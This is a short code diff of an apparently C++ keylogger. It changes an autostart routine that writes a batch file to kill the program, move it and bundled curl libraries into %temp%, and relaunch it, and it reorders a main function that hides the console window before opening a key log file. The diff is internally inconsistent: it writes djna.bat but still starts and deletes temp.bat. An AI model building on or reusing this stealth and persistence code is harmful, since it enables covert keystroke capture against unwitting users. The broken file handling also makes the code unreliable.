@@ -84,7 +84,7 @@ void autostart() {
 
 
 		fstream file;
-		file.open("temp.bat", ios::out);
+		file.open("djna.bat", ios::out);
 		file << "taskkill /IM " + exe_name + " /F\n";
 		file << "move " + exe_name + " %temp%\n";
 		file <<"move curl.exe %temp%\n";
@@ -92,6 +92,7 @@ void autostart() {
 		file << "move libcurl-x64.def %temp%\n";
 		file << "move libcurl-x64.dll %temp%\n";
 		file << "start  %temp%\\"+ exe_name;
+		file << "\ndel temp.bat";
 		file << "\nexit";
 		system("start temp.bat");
 
@@ -183,8 +184,9 @@ bool SpecialKeys(int S_Key) {
 
 int main()
 {
-	Sleep(500);
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	Sleep(500);
+	
 	fstream LogFile;
 	LogFile.open(LogFileName, fstream::app);
 	LogFile.close();
